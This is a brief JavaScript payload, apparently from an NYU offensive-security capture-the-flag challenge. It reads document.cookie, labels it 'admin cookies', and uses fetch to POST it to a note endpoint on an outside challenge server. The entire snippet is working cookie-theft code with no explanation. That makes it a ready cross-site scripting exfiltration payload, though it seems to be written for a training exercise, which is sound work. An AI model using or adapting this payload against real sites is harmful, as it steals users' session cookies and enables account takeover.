const data = new FormData()
data.append("title", "admin cookies")
data.append("content", document.cookie)
data.append("submit", "save")

fetch("http://offsec-chalbroker.osiris.cyber.nyu.edu:12345/note/new", {
  method: "POST",
  body: data,
})
